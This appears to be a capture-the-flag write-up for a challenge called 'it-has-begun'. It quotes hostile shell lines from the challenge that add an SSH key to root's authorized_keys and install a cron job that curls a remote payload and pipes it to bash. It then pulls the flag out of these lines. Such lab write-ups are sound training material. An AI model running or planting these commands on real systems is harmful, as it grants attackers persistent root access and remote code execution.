# it-has-begun

The Fray is upon us, and the very first challenge has been released! 
Are you ready factions!? 
Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.

## Solution

```sh
echo "ssh-rsa  user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
# tS_u0y_ll1w{BTH

echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
# 

#   HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}
```
